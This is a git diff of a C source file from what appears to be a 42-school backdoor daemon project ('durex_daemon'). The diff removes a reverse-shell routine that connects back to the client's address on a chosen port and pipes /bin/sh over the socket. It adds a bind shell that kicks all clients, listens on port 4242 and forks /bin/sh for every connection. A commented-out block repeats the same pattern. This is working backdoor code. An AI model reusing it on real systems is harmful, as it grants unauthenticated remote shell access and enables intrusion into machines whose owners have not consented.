@@ -6,7 +6,7 @@
 /*   By: user42 <user42@student.42.fr>              +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2022/02/09 12:00:08 by user42            #+#    #+#             */
-/*   Updated: 2022/02/11 15:09:01 by user42           ###   ########.fr       */
+/*   Updated: 2022/02/12 15:20:46 by user42           ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -80,6 +80,8 @@ void	setup_server(t_server *server)
 
 	if ((server->listen_sd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
 		fatal(server);
+	int enable = 1;
+	setsockopt(server->listen_sd, SOL_SOCKET, SO_REUSEADDR, &enable, sizeof(int));
 	
 	sockaddr.sin_family = AF_INET;
 	sockaddr.sin_port = htons(4242);
@@ -188,94 +190,89 @@ void	add_client(t_server *server)
 	server->client_nb++;
 }
 
-int		check_port(t_server *server)
+void	kick_everyone(t_server *server)
 {
-	char	digits[6];
-	int		i, j, k, port;
+	t_client	*tmp = server->clients;
 
-	if (server->buff[5] == '\n' || server->buff[5] == '\0')
-		return (0);
-	if (server->buff[5] != ' ')
-		return (-1);
+	// Closing all fds
+	if (tmp == 0)
+		return ;
+	while (tmp)
+	{
+		for (int i = 0; i <= server->max_sd; i++)
+		{
+			if (tmp->fd == i)
+				close(tmp->fd);
+		}
+		tmp = tmp->next;
+	}
 	
-	i = 6;
-	k = 0;
-	while (server->buff[i] >= 48 && server->buff[i] <= 57)
-	{
-		k++;
-		i++;
-	}
-	if ((server->buff[i] != '\n' && server->buff[i] != '\0') || k == 0 || k > 5)
-		return (-1);
-	j = 0;
-	i = 6;
-	while (j < k)
-	{
-		digits[j] = server->buff[i + j];
-		j++;
-	}
-	digits[j] = '\0';
+	// Resetting values
+	server->client_nb = 0;
+	server->max_sd = 0;
+	server->last_id = 0;
+	FD_ZERO(&(server->master_set));
 
-	port = atoi(digits);
-	if (port <= 0 || port > 65535)
-		return (-1);
-	return (port);
+	printf("[LOG] Kicking everyone from server.\n");
+
+	// Shutting down server
+	close(server->listen_sd);
 }
 
-void	spawn_shell(t_server *server, t_client *client)
+void	spawn_shell(t_server *server)
 {
-	int						port;
-	char					msg[128];
-	bzero(msg, 128);
+	kick_everyone(server);
 
-	port = check_port(server);
-	if (port == 0)
-	{
-		send_info(server, client->fd, "[*] Using default port 4444\n");
-		port = 4444;
-	}
-	if (port == -1)
-	{
-		send_info(server, client->fd, "[!] Usage: shell [port (optional)]\n$> ");
-		return ;
-	}
+	struct sockaddr_in	sockaddr;
+	char				*const args[] = {"/bin/sh", 0};
+	int					enable = 1;
 
-	printf("[LOG] Client %d requested reverse shell on %s:%d.\n", client->id, inet_ntoa((client->sockaddr).sin_addr), port);
-	sprintf(msg, "[*] Spawning your reverse shell on %s:%d...\n", inet_ntoa((client->sockaddr).sin_addr), port);
-	send_info(server, client->fd, msg);
-
-	pid_t					pid;
-
-	pid = fork();
-	if (pid == -1)
+	if ((server->listen_sd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
 		fatal(server);
-	else if (pid == 0)
+	setsockopt(server->listen_sd, SOL_SOCKET, SO_REUSEADDR, &enable, sizeof(int));
+	sockaddr.sin_family = AF_INET;
+	sockaddr.sin_port = htons(4242);
+	sockaddr.sin_addr.s_addr = htonl(INADDR_ANY);
+	if (bind(server->listen_sd, (struct sockaddr *)&sockaddr, sizeof(sockaddr)) < 0)
+		fatal(server);
+	if (listen(server->listen_sd, 2) < 0)
+		fatal(server);
+	
+	FD_SET(server->listen_sd, &(server->master_set));
+	server->max_sd = server->listen_sd;
+
+
+	while (1)
 	{
-		struct sockaddr_in		sa;
-		int						s;
-		char					*const args[] = {"/bin/sh", 0};
-
-		sa.sin_family = AF_INET;
-		sa.sin_addr.s_addr = (client->sockaddr).sin_addr.s_addr;
-		sa.sin_port = htons(port);
-
-		s = socket(AF_INET, SOCK_STREAM, 0);
-		if ((connect(s, (struct sockaddr *)&sa, sizeof(sa))) == -1)
+		server->read_set = server->write_set = server->master_set;
+		// Check the status of all child process (corresponding to shells opened by clients.)
+		// If there is no shell left, resume durex_daemon()
+		if (select(server->max_sd + 1, &(server->read_set), &(server->write_set), 0, 0) < 0)
+			continue ;
+		for (int i = 0; i <= server->max_sd; i++)
 		{
-			send_info(server, client->fd, "[!] Couldn't open reverse shell.\n$> ");
-			printf("[LOG] Couldn't open shell for client %d.\n", client->id);
-			exit(1);
+			if (FD_ISSET(i, &(server->read_set)))
+			{
+				if (i == server->listen_sd)
+				{
+					int new_sd = accept(server->listen_sd, NULL, NULL);
+					if (new_sd > server->max_sd)
+						server->max_sd = new_sd;
+					pid_t pid = fork();
+					if (pid == 0)
+					{
+						dup2(new_sd, 0);
+						dup2(new_sd, 1);
+						dup2(new_sd, 2);
+						execve("/bin/sh", args, NULL);
+					}
+					// Parent : add pid to the client.
+					// Continue looping.
+					break ;
+				}
+			}
 		}
-		send_info(server, client->fd, "[+] Reverse shell connection successfull.\n$> ");
-		printf("[LOG] Successfully opened shell for client %d.\n", client->id);
-		dup2(s, 0);
-		dup2(s, 1);
-		dup2(s, 2);
-
-		execve("/bin/sh", args, 0);
 	}
-	else
-		return ;
 }
 
 void	durex_daemon(void)
@@ -322,8 +319,8 @@ void	durex_daemon(void)
 						{
 							if (!strcmp(server.buff, "?"))
 								send_info(&server, i, "?		show this help\nshell [port]	Spawn reverse shell on specified port (default 4444)\nexit		Close connection\n$> ");
-							else if (!strncmp(server.buff, "shell", 5))
-								spawn_shell(&server, get_client_from_id(&server, tmp->id));
+							else if (!strcmp(server.buff, "shell"))
+								spawn_shell(&server);
 							else if (!strcmp(server.buff, "exit"))
 							{
 								send_info(&server, i, "Bye!");
@@ -339,3 +336,33 @@ void	durex_daemon(void)
 		}
 	}
 }
+
+
+
+
+
+
+
+/*
+
+
+	pid = fork();
+	if (pid == 0)
+	{
+		
+
+		dup2(client_sock, 0);
+		dup2(client_sock, 1);
+		dup2(client_sock, 2);
+
+		execve("/bin/sh", args, NULL);
+		close(server->listen_sd);
+	}
+	else
+	{
+		waitpid(pid, &status, 0);
+		durex_daemon();
+	}
+
+
+*/
